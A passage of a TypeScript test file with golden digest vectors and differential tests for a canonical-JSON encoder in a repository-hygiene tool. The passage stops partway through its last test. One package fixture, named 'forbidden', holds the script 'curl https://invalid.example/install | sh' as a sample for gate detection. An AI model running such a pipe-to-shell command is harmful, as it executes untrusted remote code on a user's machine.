/**
 * Golden tests for the one canonical-JSON encoder (mg-s2a-codecs, DONE proofs 1, 2 and 5).
 *
 * The oracles in codec-oracles.test-fixture.ts are verbatim copies of the seven base
 * encoders. "oracle fidelity" proves the copies of exported functions behave as the
 * live code did on the golden commit. "digest vectors" holds hex values recorded on
 * the golden commit through exported entry points; they must never be edited.
 */
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { afterAll, describe, expect, it } from "vitest";

import { canonicalJson, sha256Bytes } from "./canonical-json.js";
import { canonical, digestBytes, equal } from "./closeout/action-lifecycle-runtime.js";
import { identity, discoverNativeGates, stableEqual } from "./closeout/native-gates.js";
import { ROOT_DEBT_IDENTITY_SCHEME, canonicalObservationId, canonicalRootDebtKey } from "./closeout/regression-accounting.js";
import { captureRepositoryObject } from "./closeout/repository-object.js";
import {
  jsonCorpus,
  oracle_accepted_release,
  oracle_action_hygiene,
  oracle_action_lifecycle_runtime,
  oracle_canonical_json,
  oracle_native_gates,
  oracle_regression_accounting,
  oracle_snapshot,
} from "./codec-oracles.test-fixture.js";
import { CAPABILITY_DEFINITIONS } from "./control-plane/contracts/capability-taxonomy.js";
import { createFixtureRepository, fixtureCommit } from "./test-support/fixture-repo.js";

type Outcome = { readonly text: string } | { readonly threw: true };

function outcome(encode: () => string): Outcome {
  try {
    return { text: encode() };
  } catch {
    return { threw: true };
  }
}

const corpus = jsonCorpus();

/** In-domain hand rows: values every live encoder treats identically before and after the slice. */
const handRows: readonly unknown[] = [
  { B: 1, a: 2 },
  { a: { B: [1, { d: 1, c: 2 }], A: -0 } },
  [-0, 1e21, -1e-7, 5e-324, 2 ** 53],
  { "10": 1, "9": 2, "1": 3, "": 4 },
  { "\u{1f600}": 1, "\ue000": 2, a: 3 },
  Object.fromEntries([["__proto__", 1], ["constructor", 2]]),
  "\u2028\u2029\"\\\n\u0000",
  [],
  {},
  [[[]], [{}]],
];

/** Equality pairs: each value with itself, its neighbour, and a key-reordered copy. */
function reordered(value: unknown): unknown {
  if (Array.isArray(value)) return value.map(reordered);
  if (value !== null && typeof value === "object") {
    return Object.fromEntries(Object.entries(value).reverse().map(([key, item]) => [key, reordered(item)]));
  }
  return value;
}

function pairs(values: readonly unknown[]): [unknown, unknown][] {
  return values.flatMap((value, index) => [
    [value, value],
    [value, values[(index + 1) % values.length]],
    [value, reordered(value)],
  ] as [unknown, unknown][]);
}

describe("oracle fidelity", () => {
  const values = [...corpus, ...handRows];

  it("canonical-json canonicalJson equals its oracle on every corpus value", () => {
    for (const value of values) {
      expect(outcome(() => canonicalJson(value))).toEqual(outcome(() => oracle_canonical_json.canonicalJson(value)));
    }
  });

  it("canonical-json canonicalJson refuses what its oracle refuses: undefined fields and non-finite numbers", () => {
    for (const value of [{ a: undefined }, [Number.NaN], { a: Number.POSITIVE_INFINITY }, () => 1, 1n, Symbol("s")]) {
      expect(() => oracle_canonical_json.canonicalJson(value)).toThrow();
      expect(() => canonicalJson(value)).toThrow();
    }
  });

  it("native-gates identity and stableEqual equal their oracles, including dropped undefined fields", () => {
    const omitted = [{ a: undefined, b: 1 }, { b: 1 }, { nested: { x: undefined, y: [1, { z: undefined }] } }];
    for (const value of [...values, ...omitted]) {
      expect(outcome(() => identity(value))).toEqual(outcome(() => oracle_native_gates.identity(value)));
    }
    for (const value of [[undefined], { a: Number.NaN }, 1n]) {
      expect(() => oracle_native_gates.identity(value)).toThrow();
      expect(() => identity(value)).toThrow();
    }
    for (const [left, right] of pairs([...values, ...omitted])) {
      expect(stableEqual(left, right)).toBe(oracle_native_gates.stableEqual(left, right));
    }
  });

  it("action-lifecycle-runtime canonical and equal equal their oracles on plain JSON", () => {
    for (const value of values) {
      expect(outcome(() => canonical(value))).toEqual(outcome(() => oracle_action_lifecycle_runtime.canonical(value)));
    }
    for (const [left, right] of pairs(values)) {
      expect(equal(left, right)).toBe(oracle_action_lifecycle_runtime.equal(left, right));
    }
  });
});

// ---------------------------------------------------------------------------
// Digest vectors (DONE proof 5). Recorded on the golden commit; never edit.

const OBSERVATION_INPUTS = [
  { source_id: "public_safety", source_native_fingerprint: "0".repeat(64) },
  { source_id: "semantic_boundary/v2", source_native_fingerprint: "a".repeat(64) },
  { source_id: "language-policy:1", source_native_fingerprint: "0123456789abcdef".repeat(4) },
  { source_id: "github_actions@3", source_native_fingerprint: "f".repeat(64) },
  { source_id: "native.gates+x~y", source_native_fingerprint: "9".repeat(32) + "1".repeat(32) },
  { source_id: "0", source_native_fingerprint: "e".repeat(64) },
] as const;

const ROOT_DEBT_INPUTS = [
  { repo_id: "local-path-sha256:" + "2".repeat(64), normalizer: "public-safety/1", cause_key: null },
  { repo_id: "repo", normalizer: "semantic@2", cause_key: { rule: "email-address", path: "notes.txt", line: 1 } },
  { repo_id: "r\u00e9po \u4e2d", normalizer: "n", cause_key: [1, -0, 1e21, -1e-7, "a\"b\\c\n"] },
  { repo_id: "repo", normalizer: "language-policy/1", cause_key: { B: { b: [true, false, null] }, a: "\u{1f600}" } },
  { repo_id: "repo", normalizer: "native-gates/1", cause_key: { "10": 1, "9": 2, "": [], nested: {} } },
  { repo_id: "repo", normalizer: "github-actions/1", cause_key: "uses: actions/checkout@v4" },
] as const;

/** The subject-state record shape of native-gates.ts captureSubjectState, with fixed digests. */
const SUBJECT_STATE = {
  record_type: "mister-clean.native-gate-subject-state",
  schema_version: "1.0",
  repository_object: {
    record_type: "mister-clean.repository-object",
    schema_version: "1.0",
    head_commit: "1".repeat(40),
    surface: "tracked_and_nonignored",
    entry_count: 3,
    sha256: "3".repeat(64),
  },
  refs_sha256: "4".repeat(64),
  stash_sha256: "5".repeat(64),
  worktree_topology_sha256: "6".repeat(64),
} as const;

/** run-receipt.test.ts validReceipt(). */
const RUN_RECEIPT = {
  record_type: "mister-clean.run-receipt",
  schema_version: "1",
  receipt_id: "mc-receipt:123e4567-e89b-42d3-a456-426614174000",
  invocation_id: null,
  mode: "AUDIT",
  repository_id: `local-path-sha256:${"2".repeat(64)}`,
  subject: {
    repository_object: { record_type: "mister-clean.repository-object", schema_version: "1.0", head_commit: "1".repeat(40), surface: "tracked_and_nonignored", entry_count: 1, sha256: "3".repeat(64) },
    head_commit: "1".repeat(40),
    head_tree: "4".repeat(40),
  },
  dirty: false,
  detector_registry_sha256: "5".repeat(64),
  runtime_identity_sha256: "6".repeat(64),
  agent: { identity_status: "unobserved", card_ref: null, source: null },
  families: ["public_safety"],
  findings: [{
    fingerprint: "7".repeat(64),
    family: "public_safety",
    rule: "email-address",
    path: "notes.txt",
    anchor: { kind: "value_digest", blob_oid: null, content_sha256: "8".repeat(64), line_hint: 1 },
    severity: null,
    legacy_fingerprint: "9".repeat(64),
  }],
  verdict: "AUDIT_ONLY",
  exit_code: 1,
  observed_at: "2026-11-03T00:00:00.000Z",
  finished_at: "2026-11-03T00:00:01.000Z",
} as const;

/** mister-clean-invocation-journal.test.ts legacy started line. */
const JOURNAL_LINE = {
  record_type: "mister-clean.invocation-receipt",
  schema_version: "1.0",
  event: "started",
  invocation_id: "mc-invocation:legacy",
  command: "detect",
  argv_sha256: "1".repeat(64),
  observed_at: "2026-09-08T00:00:00.000Z",
  identity_provenance: "UNOBSERVED",
  evaluation_run_event_id: null,
} as const;

/** trust-root.test.ts policyBytes() shape, with a fixed public key in place of a generated one. */
const TRUST_POLICY = {
  record_type: "mister-clean.semantic-trust-policy",
  schema_version: "1.0",
  policy_id: "trust-root-fixture",
  keys: [{
    actor_id: "qa-1",
    key_id: "qa-key",
    public_key_pem: "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEA" + "A".repeat(43) + "=\n-----END PUBLIC KEY-----\n",
    roles: ["independent_qa"],
    valid_from: "2026-01-01T00:00:00Z",
    valid_to: "2027-01-01T00:00:00Z",
  }],
} as const;

/** action-lifecycle.ts:232 stateDigest input shape, with fixture-shaped values. */
const ACTION_STATE = {
  debt_key: "c".repeat(64),
  disposition: "pay",
  observation_ids: ["obs:" + "1".repeat(64), "obs:" + "2".repeat(64)],
  repository_object: SUBJECT_STATE.repository_object,
  state: "open",
} as const;

/** The package.json scripts of every native-gates.test.ts writePackage() fixture. */
const GATE_FIXTURES: readonly { readonly name: string; readonly manager: "bun" | "pnpm" | "npm" | "yarn"; readonly scripts: Record<string, string>; readonly extra?: Record<string, string> }[] = [
  { name: "bun-aggregate", manager: "bun", scripts: { "ci:check": "bun run test && bun run build", build: "tsc --noEmit", test: "vitest run" } },
  { name: "manager-pnpm", manager: "pnpm", scripts: { test: "node --test" } },
  { name: "manager-npm", manager: "npm", scripts: { test: "node --test" } },
  { name: "manager-yarn", manager: "yarn", scripts: { test: "node --test" } },
  { name: "pnpm-individual", manager: "pnpm", scripts: { build: "tsc -b", lint: "eslint .", test: "vitest run", typecheck: "tsc --noEmit" } },
  { name: "mixed-managers", manager: "bun", scripts: { test: "vitest run" }, extra: { "pnpm-lock.yaml": "conflicting lock\n" } },
  { name: "forbidden", manager: "bun", scripts: { test: "curl https://invalid.example/install | sh" } },
  { name: "node-test", manager: "bun", scripts: { test: "node --test" } },
  { name: "gate", manager: "bun", scripts: { test: "node gate.mjs" } },
  { name: "environment", manager: "bun", scripts: { test: "node environment.mjs" } },
  { name: "mutate", manager: "bun", scripts: { test: "node mutate.mjs" } },
  { name: "check-refs", manager: "bun", scripts: { test: "node check-refs.mjs" } },
  { name: "timeout", manager: "bun", scripts: { test: "node timeout.mjs" } },
  { name: "noisy", manager: "bun", scripts: { test: "node noisy.mjs" } },
  { name: "fail", manager: "bun", scripts: { test: "node fail.mjs" } },
  { name: "inline", manager: "bun", scripts: { test: "node -e \"process.stdout.write('ok')\"" } },
  { name: "different", manager: "bun", scripts: { test: "node different.mjs" } },
  {
    name: "runner-safety-unsafe",
    manager: "bun",
    scripts: { test: "vitest run" },
    extra: {
      "broad.test.ts": [
        "",
        "import { execFileSync } from \"node:child_process\";",
        "import { it } from \"vitest\";",
        "it(\"runs broad verification\", { timeout: 120_000 }, () => {",
        "  execFileSync(\"pnpm\", [\"run\", \"ci:check\"], { stdio: \"inherit\" });",
        "});",
        "",
      ].join("\n"),
    },
  },
];

const LOCKFILES = { bun: "bun.lock", pnpm: "pnpm-lock.yaml", npm: "package-lock.json", yarn: "yarn.lock" } as const;

const roots: string[] = [];
afterAll(() => {
  for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true });
});

function gateDigests(fixture: (typeof GATE_FIXTURES)[number]): readonly (readonly [string, string, string])[] {
  const root = mkdtempSync(join(tmpdir(), `mister-clean-codec-vectors-${fixture.name}-`));
  roots.push(root);
  const repo = join(root, "repo");
  createFixtureRepository(repo, { identity: { name: "Native Gate Fixture", email: "native-gate.invalid" } });
  writeFileSync(join(repo, "package.json"), `${JSON.stringify({
    name: "native-gate-fixture",
    private: true,
    packageManager: `${fixture.manager}@1.0.0`,
    scripts: fixture.scripts,
  }, null, 2)}\n`);
  writeFileSync(join(repo, LOCKFILES[fixture.manager]), "fixture lock\n");
  for (const [path, text] of Object.entries(fixture.extra ?? {})) {
    mkdirSync(join(repo, path, ".."), { recursive: true });
    writeFileSync(join(repo, path), text);
  }
  fixtureCommit(repo, "fixture");
  return discoverNativeGates(repo, captureRepositoryObject(repo)).gates
    .map((gate) => [gate.id, gate.semantic_contract_sha256, gate.definition_sha256] as const);
}

const OBSERVATION_ID_VECTORS: readonly string[] = [
  "9fc5d2d556e4ada022e36ece2a0a610da9c5ed8cc2310e23f8a7021fc95a9bfe",
  "f56524c9d0c5f34c929d82903c87bb6223eb55f1d22571d41bda7ba5f7cd2002",
  "1173b283e69052ff02dcf8abf02a95b5e727f49c62bea14c39aa95ab476ad737",
  "368c19bdb17603b93dbfae7ba53b702963d4cd2a26279a384e6d3f128e3ecd00",
  "e2a5ad707ac907a42ea3f05869c031b097429da9207889030d0870781d8c0b98",
  "259e1d3176ece4827cef480161d4a30ad0ef279fc33178e278d4001edba1baab",
];
const ROOT_DEBT_KEY_VECTORS: readonly string[] = [
  "80188a971e700171d97fcb837fa4d41fa3d9b580322e0b9784677b81859301fd",
  "5bb4d31d93b27bb6677543a0cfe810bc9469de043a243e2bd3442fece7c73c28",
  "b89e1f9a512d2856d835becfe4c2a123ade9f22836742b028d727a3aae496f23",
  "3935e8f19748ba46ec2810ecee229e51e54f71cd5bccd156450e157c80f814ae",
  "259d90812079e31f2a46b2d246d7a258ede97c911e133b089f3e748300519188",
  "e8361a1ca5f370e7b9f30815cbd7a17659fd76d35bbed049462b2794d8e02cbc",
];
const SUBJECT_STATE_SHA256 = "eac9f35055212e8943fc096e02ef0c37424184f3d6139580c1c880daca89a3a4";
const RECORD_VECTORS: Record<string, { readonly canonical_sha256: string; readonly bytes: number }> = {
  journal_line: { bytes: 336, canonical_sha256: "96b4678ba1d81aaad517134c9de52cfab12aef84a477a02a3d7f8ca4cf6d43f9" },
  run_receipt: { bytes: 1497, canonical_sha256: "61a99dbf6f55e8d401f2020c6804553575dba90de73574451985d1d116f636f4" },
  trust_policy: { bytes: 388, canonical_sha256: "93d84cb7975a70f1eda057d0e39ddc66b2c01e19ee4e08194f38b25e14743e65" },
};
const ACTION_STATE_DIGEST = "ec9dcc83951c2a1e19e59d81d458869e7abefb6490f1c59f330edb90e53f69ca";
const GATE_VECTORS: Record<string, readonly (readonly [string, string, string])[]> = {
  "bun-aggregate": [
    [
      "node:.:ci-check",
      "dde70400b9f25f296c64fb3c7f04b873bc74edd42084814ad8cbbfec9a284627",
      "65d13b8e742ed2ca7411be07c8ada2a90e476ba162d30f7377a9f980cceac961",
    ],
  ],
  "check-refs": [
    [
      "node:.:test",
      "4985ad05c16a59b68888f27e8ae3dfa929c5744e6b4f0296a63674e35fa08a7a",
      "548bbee519f24042baa6118fd1411f774c6318c658801864f1999feb0f95659a",
    ],
  ],
  "different": [
    [
      "node:.:test",
      "fa1b80747d314d2028741b9107358652fa81c04b6fdf5a459dd7e8ef6adfa27b",
      "edce7b06d992d895ee46dcbe56482fbd71caa59be4d540f83a2d38301d222fba",
    ],
  ],
  "environment": [
    [
      "node:.:test",
      "420fa6b00a6eb30d70b8698a8959869dc925303037196467e93da83475423625",
      "b400d882dbe64502d955dbc7fbb901242be98148ec32f16d2429bad6f763f27b",
    ],
  ],
  "fail": [
    [
      "node:.:test",
      "c1752a630458d0df7a17b7584432783240a4318125faffbb76fddc01a3fa5ffa",
      "ac4e82b7c18e9b4310109977cacb18e9f7ee199face8fd168320375b8313d1fd",
    ],
  ],
  "forbidden": [
    [
      "node:.:test",
      "4cd1493e40c2bf6b4d9746059b2d89826e54f89781634770c6a672878de133a1",
      "32bfe3bb48f55bb7bea866ef5a9dc385ddf32a2f47ed624aee5328127b32cb3e",
    ],
  ],
  "gate": [
    [
      "node:.:test",
      "717df33a90e3d6ca16fad537c7613a5b35528d12f5ca805203850fd86c02744c",
      "46dcc6f750264e9c72a4872b0bde9c92dffad27447188c5055292f715149a3be",
    ],
  ],
  "inline": [
    [
      "node:.:test",
      "dc1df7483a1c9f9b09e0b09c48eb75d592a703b1d607c3f08e64039a055bb41f",
      "58f419532175d4298dfdef46ea6571e12c70542da46c362b678b68109978f9d3",
    ],
  ],
  "manager-npm": [
    [
      "node:.:test",
      "29046ea7ce0dae84e1625e526c80235e26abe1bdfc849cdd082fa8b0fa9669a3",
      "910381f605ef4757129415721517079cbb45fc96ff0750db8f91e5eb65d2ef25",
    ],
  ],
  "manager-pnpm": [
    [
      "node:.:test",
      "97af0c7146bc90704c443980ee7ea06b7a5c76c19232314ab42441c4e879c97d",
      "6a66d48be771b409676fa56bb9ea9ca68d16a189d63fc1519efb00b3a629a4ae",
    ],
  ],
  "manager-yarn": [
    [
      "node:.:test",
      "bb30ecdfdeb3978603407bdab9aab7ce4980026815b3717068580222e0b1dc58",
      "f261b85b6c22d88c9231498b19f55f1a3fb9d7a50f6db32b486ef15ecc91b2a4",
    ],
  ],
  "mixed-managers": [
    [
      "node:.:native-quality",
      "b38aecf30e2c9b24772311e7c1b57772ccea21b02ed1c82088acad282c82ff12",
      "c0f9d43dd7666d846bb6c11f0aa426050e7644e253da6d4ba3e75107f35c30cc",
    ],
  ],
  "mutate": [
    [
      "node:.:test",
      "7327aa19ed7d1f248c88d86450d0aa5108dbeed3a50c62b1856fdb4902e6cd0c",
      "ed17dda229807d99bd363e12e9fc0caaf52d917d44305ea5ee103404a02ba52a",
    ],
  ],
  "node-test": [
    [
      "node:.:test",
      "c0d6f0b4135855c519ffb9e29daa6a604aed2b6e3ca54e4e0db0c27f84eb04a1",
      "c270331bbe185b53489f97815bc3865898a402e417ac57f5a89929948567441d",
    ],
  ],
  "noisy": [
    [
      "node:.:test",
      "1deb6c020d6673200c218e332fcf826b59061f513a338585416b0a533dded2da",
      "59397ff95a3306838877d59beef2ef18137fcee52945076b260a5d31163b146e",
    ],
  ],
  "pnpm-individual": [
    [
      "node:.:test",
      "25eb38e371d451f2bade53e3562aac0dca6bea2e03d9d00b0607bebbf2a25f74",
      "1b99727dc909ae56a29dddcd83012af0a999d92cb3c68ecfe6778f3f47e881ce",
    ],
    [
      "node:.:lint",
      "2575cdf0e0a5ab6db8a5328361ca86c0caefd37b70cdf21f4e71edfc444800ec",
      "beb796dab93c8ccc99de32e03fb776e69ee89dea5a7df3b8b2dc4b8090350cb8",
    ],
    [
      "node:.:typecheck",
      "647610335d4e79b4e6597be7aea46d6dd5e6e2ae5864b0ad5b0ee357343c7317",
      "9a90e6ec82ec98fe61d7307a0dbf56d79ed860e966e0e23ab1677ceeaf5af4b0",
    ],
    [
      "node:.:build",
      "474715306a87d017398e19793607d24c22c8a792fb9d9ab1e344dcb42b10618e",
      "6a5a08d9352565e2566654d65de2427eebc5a08a6dda4544d22627c216b40728",
    ],
  ],
  "runner-safety-unsafe": [
    [
      "node:.:test",
      "2ed7180b20176ddbac79f3ae1b519696e6ca5ecf3c1815000ef31e6e6c2cb2c2",
      "82fe1d80b1494957c002ac36f0bdd94c902f45549d87cdd63f5ee0b8926f8c04",
    ],
    [
      "repository:runner-safety",
      "900f4814e54d3a0472325d2da041147e93a8029437a472dc2077e387bdd1263c",
      "5adcbf3d7d6c7863895fb9c67355f4655a1b918ce9191788249321fe3f726c3b",
    ],
  ],
  "timeout": [
    [
      "node:.:test",
      "81d08a6b197882823e7099b8f434f920039ece5588bf1e87617de57cc1924343",
      "b8804d000a491208acb377fab74698777255a71188946547e378a425686702da",
    ],
  ],
};

describe("digest vectors", () => {
  it("canonicalObservationId is unchanged for the fixed inputs", () => {
    expect(OBSERVATION_INPUTS.map((input) => canonicalObservationId(input))).toEqual(OBSERVATION_ID_VECTORS);
  });

  it("canonicalRootDebtKey is unchanged for the fixed inputs", () => {
    expect(ROOT_DEBT_INPUTS.map((input) => canonicalRootDebtKey(input))).toEqual(ROOT_DEBT_KEY_VECTORS);
  });

  it("native gate state_sha256 identity is unchanged", () => {
    expect(identity(SUBJECT_STATE)).toBe(SUBJECT_STATE_SHA256);
  });

  it("native gate identity drops undefined fields to the same vector", () => {
    expect(identity({ ...SUBJECT_STATE, superseded_by: undefined, repository_object: { ...SUBJECT_STATE.repository_object, tree: undefined } }))
      .toBe(SUBJECT_STATE_SHA256);
  });

  it("native gate semantic_contract_sha256 and definition_sha256 are unchanged for every native-gates.test.ts fixture", () => {
    const actual = Object.fromEntries(GATE_FIXTURES.map((fixture) => [fixture.name, gateDigests(fixture)]));
    expect(actual).toEqual(GATE_VECTORS);
  });

  it("canonicalJson and sha256Bytes of a run receipt, a journal line and a trust policy are unchanged", () => {
    const actual = Object.fromEntries(Object.entries({ run_receipt: RUN_RECEIPT, journal_line: JOURNAL_LINE, trust_policy: TRUST_POLICY })
      .map(([name, value]) => {
        const text = canonicalJson(value);
        return [name, { canonical_sha256: sha256Bytes(text), bytes: Buffer.byteLength(text) }];
      }));
    expect(actual).toEqual(RECORD_VECTORS);
  });

  it("the action-lifecycle stateDigest is unchanged", () => {
    expect(digestBytes(canonical(ACTION_STATE))).toBe(ACTION_STATE_DIGEST);
  });
});

// ---------------------------------------------------------------------------
// Differential and declared deltas (DONE proofs 1 and 2). Added after the golden commit.

type Mode = "refuse" | "omit";

/** UTF-16 code-unit order and Unicode code-point order disagree on this key pair. */
function orderDisagrees(left: string, right: string): boolean {
  const units = left < right ? -1 : left > right ? 1 : 0;
  const leftPoints = [...left].map((character) => character.codePointAt(0)!);
  const rightPoints = [...right].map((character) => character.codePointAt(0)!);
  let points = 0;
  for (let index = 0; points === 0 && index < Math.min(leftPoints.length, rightPoints.length); index += 1) {
    points = leftPoints[index]! < rightPoints[index]! ? -1 : leftPoints[index]! > rightPoints[index]! ? 1 : 0;
  }
  if (points === 0) points = leftPoints.length < rightPoints.length ? -1 : leftPoints.length > rightPoints.length ? 1 : 0;
  return units !== points;
}

/** Delta 2(c) rows: some object holds two keys whose code-unit and code-point orders differ. */
function hasCodePointOrderedKeys(value: unknown): boolean {
  if (Array.isArray(value)) return value.some(hasCodePointOrderedKeys);
  if (value === null || typeof value !== "object") return false;
  const keys = Object.keys(value);
  return keys.some((left, index) => keys.slice(index + 1).some((right) => orderDisagrees(left, right)))
    || Object.values(value).some(hasCodePointOrderedKeys);
}

/** Delta 2(a) rows: an object with two or more keys sits somewhere inside an array. */
function hasObjectInsideArray(value: unknown, insideArray = false): boolean {
  if (Array.isArray(value)) return value.some((entry) => hasObjectInsideArray(entry, true));
  if (value === null || typeof value !== "object") return false;
  return (insideArray && Object.keys(value).length > 1) || Object.values(value).some((entry) => hasObjectInsideArray(entry, insideArray));
}

function cycle(): unknown {
  const value: Record<string, unknown> = { a: 1 };
  value.self = value;
  return value;
}

function accessor(): unknown {
  return Object.defineProperty({}, "a", { enumerable: true, get: () => 1 });
}

function nonEnumerable(): unknown {
  return Object.defineProperty({ b: 1 }, "a", { enumerable: false, value: 1 });
}

class Point {
  readonly x: number;
  constructor(x: number) {
    this.x = x;
  }
}

interface Site {
  readonly site: string;
  readonly mode: Mode;
  readonly encode: (value: unknown) => string;
  readonly hand: readonly unknown[];
  /** Rows of a declared delta for this site; the test asserts their exact shape separately. */
  readonly delta?: (value: unknown) => boolean;
}

const ENCODER_SITES: readonly Site[] = [
  {
    site: "canonical-json.ts:10 canonicalJson",
    mode: "refuse",
    encode: (value) => oracle_canonical_json.canonicalJson(value),
    hand: [{ a: undefined }, [Number.NaN], { a: Number.POSITIVE_INFINITY }, () => 1, 1n, Symbol("s"), { "\uffff": 1, "\u{10000}": 2 }],
  },
  {
    site: "native-gates.ts:489 canonicalJson",
    mode: "omit",
    encode: (value) => oracle_native_gates.canonicalJson(value),
    hand: [{ a: undefined, b: 1 }, { nested: { x: undefined, y: [1, { z: undefined }] } }, [undefined], { a: Number.NaN }, 1n, Symbol("s"), { b: undefined }],
  },
  {
    site: "regression-accounting.ts:238 canonicalJson",
    mode: "refuse",
    encode: (value) => oracle_regression_accounting.canonicalJson(value),
    hand: [cycle(), [1, , 2], Object.assign(Object.create(null) as object, { b: 1, a: 2 }), new Point(1), { [Symbol("k")]: 1 }, "\ud800", { "\udc00": 1 }, accessor(), nonEnumerable(), { a: undefined }, Number.NaN],
    delta: hasCodePointOrderedKeys,
  },
  {
    site: "accepted-release.ts:71 canonical",
    mode: "refuse",
    encode: (value) => oracle_accepted_release.canonical(value),
    hand: [JSON.parse("{\"name\":\"@scope/pkg\",\"version\":\"1.0.0\",\"dist\":{\"tarball\":\"https://registry.invalid/pkg.tgz\",\"integrity\":\"sha512-x\"}}"), JSON.parse("[{\"b\":1,\"a\":[2,{\"d\":3,\"c\":4}]}]")],
  },
  {
    site: "action-lifecycle-runtime.ts:58 canonical",
    mode: "refuse",
    encode: (value) => oracle_action_lifecycle_runtime.canonical(value),
    hand: [structuredClone({ b: [1, { d: 1, c: -0 }], a: null })],
  },
  {
    site: "action-hygiene.ts:222 canonical",
    mode: "refuse",
    encode: (value) => oracle_action_hygiene.canonical(value),
    hand: [{ a: undefined }, { a: Number.NaN }, [Number.POSITIVE_INFINITY], () => 1, { path: "a b", branch: null, locked_reason: null, prunable_reason: null }],
  },
  {
    site: "snapshot.ts:454 canonicalJsonForSnapshot",
    mode: "refuse",
    encode: (value) => oracle_snapshot.canonicalJsonForSnapshot(value),
    // CAPABILITY_DEFINITIONS (objects inside an array) is a delta 2(a) row; it is asserted there.
    hand: [{ starting_real_issues: 0, paid: 1, ending_real_issues: -0 }, [1, [2, { a: 1 }]]],
    delta: (value) => hasObjectInsideArray(value),
  },
];

describe("canonical json differential", () => {
  it.each(ENCODER_SITES)("$site: the shared encoder in $mode mode emits identical bytes and refusals", ({ mode, encode, hand, delta }) => {
    const mismatches: string[] = [];
    let compared = 0;
    // Hand rows sit outside the delta domains by construction; only corpus rows are classified.
    for (const value of [...corpus.filter((entry) => !delta?.(entry)), ...hand]) {
      compared += 1;
      const expected = outcome(() => encode(value));
      const actual = outcome(() => canonicalJson(value, { undefinedFields: mode }));
      if ("threw" in expected) {
        if (!("threw" in actual)) mismatches.push(`oracle threw, shared encoded: ${"text" in actual ? actual.text : ""}`);
      } else if (!("text" in actual) || actual.text !== expected.text) {
        mismatches.push(`oracle ${expected.text}`);
      }
    }
    expect(compared).toBeGreaterThan(corpus.length / 2);
    expect(mismatches.slice(0, 10)).toEqual([]);
  });

  it("the live native-gates wrappers keep omit mode: identity and stableEqual equal their oracles, undefined-field rows included", () => {
    const undefinedRows = [{ a: undefined, b: 1 }, { nested: { x: undefined, y: [1, { z: undefined }] } }, { b: undefined }];
    const mismatches: string[] = [];
    for (const value of [...corpus, ...undefinedRows]) {
      const expected = outcome(() => oracle_native_gates.identity(value));
      if (JSON.stringify(outcome(() => identity(value))) !== JSON.stringify(expected)) mismatches.push(JSON.stringify(expected));
    }
    for (const [left, right] of pairs([...undefinedRows, { a: 1 }, { b: 1 }, {}])) {
      if (stableEqual(left, right) !== oracle_native_gates.stableEqual(left, right)) mismatches.push("stableEqual");
    }
    expect(mismatches.slice(0, 10)).toEqual([]);
  });

  it("the live action-lifecycle-runtime wrappers equal their oracle on plain JSON", () => {
    const mismatches = corpus.filter((value) => JSON.stringify(outcome(() => canonical(value))) !== JSON.stringify(outcome(() => oracle_action_lifecycle_runtime.canonical(value))));
    expect(mismatches.length).toBe(0);
  });

  it("delta rows differ from their oracle only in key order and match the root encoder's bytes", () => {
    // No JSON.parse here: node 26.12's JSON.parse can corrupt escaped keys after warm-up.
    // The same characters in a different order is the parse-free form of "same value, other key order".
    const sortedCharacters = (text: string): string => [...text].sort().join("");
    for (const { encode, delta } of ENCODER_SITES) {
      if (delta === undefined) continue;
      const rows = corpus.filter(delta);
      expect(rows.length).toBeGreaterThan(0);
      let reordered = 0;
      for (const value of rows) {
        const shared = canonicalJson(value);
        const oracle = encode(value);
        expect(shared).toBe(oracle_canonical_json.canonicalJson(value));
        expect(sortedCharacters(shared)).toBe(sortedCharacters(oracle));
        if (shared !== oracle) reordered += 1;
      }
      expect(reordered).toBeGreaterThan(0);
    }
  });
});

describe("canonical json declared deltas", () => {
  it("(a) snapshot comparisons are key-order-insensitive inside arrays", () => {
    const reorderedCapabilities = CAPABILITY_DEFINITIONS.map((definition) => Object.fromEntries(Object.entries(definition).reverse()));
    expect(oracle_snapshot.canonicalJsonForSnapshot(reorderedCapabilities)).not.toBe(oracle_snapshot.canonicalJsonForSnapshot(CAPABILITY_DEFINITIONS));
    expect(canonicalJson(reorderedCapabilities)).toBe(canonicalJson(CAPABILITY_DEFINITIONS));
  });

  it("(b) action-lifecycle-runtime, accepted-release and snapshot refuse an undefined field and NaN", () => {
    expect(oracle_action_lifecycle_runtime.canonical({ a: undefined })).toBe("{\"a\":undefined}");
    expect(oracle_action_lifecycle_runtime.canonical({ a: Number.NaN })).toBe("{\"a\":null}");
    expect(oracle_action_lifecycle_runtime.equal({ a: Number.NaN }, { a: null })).toBe(true);
    expect(oracle_accepted_release.canonical({ a: undefined })).toBe("{\"a\":undefined}");
    expect(oracle_accepted_release.canonical({ a: Number.NaN })).toBe("{\"a\":null}");
    expect(oracle_snapshot.canonicalJsonForSnapshot({ a: undefined })).toBe("{\"a\":undefined}");
    expect(oracle_snapshot.canonicalJsonForSnapshot({ a: Number.NaN })).toBe("{\"a\":null}");
    // The live action-lifecycle-runtime wrappers, then the shared refuse mode the other two sites use.
    expect(() => canonical({ a: undefined })).toThrow(/undefined/u);
    expect(() => canonical({ a: Number.NaN })).toThrow(/finite/u);
    expect(() => equal({ a: Number.NaN }, { a: null })).toThrow(/finite/u);
    expect(() => equal({ a: undefined }, {})).toThrow(/undefined/u);
    expect(() => canonicalJson({ a: undefined })).toThrow(/undefined/u);
    expect(() => canonicalJson({ a: Number.NaN })).toThrow(/finite/u);
  });

  it("(c) root-debt keys sort object keys by UTF-16 code units, as RFC 8785 does", () => {
    const input = { repo_id: "repo", normalizer: "unicode@1", cause_key: { "\uffff": "bmp", "\u{10000}": "astral" } };
    const preimage = [ROOT_DEBT_IDENTITY_SCHEME, input.repo_id, input.normalizer, input.cause_key];
    expect(oracle_regression_accounting.canonicalJson(preimage)).toContain("{\"\uffff\":\"bmp\",\"\u{10000}\":\"astral\"}");
    expect(canonicalJson(preimage)).toContain("{\"\u{10000}\":\"astral\",\"\uffff\":\"bmp\"}");
    expect(canonicalRootDebtKey(input)).toBe(sha256Bytes(canonicalJson(preimage)));
    expect(canonicalRootDebtKey(input)).not.toBe(sha256Bytes(oracle_regression_accounting.canonicalJson(preimage)));
  });

  it("(d) the shared encoder refuses what the base encoders overflowed on or accepted", () => {
    const rows: readonly [string, unknown][] = [
      ["cycle", cycle()],
      ["array hole", [1, , 2]],
      ["non-plain prototype", new Point(1)],
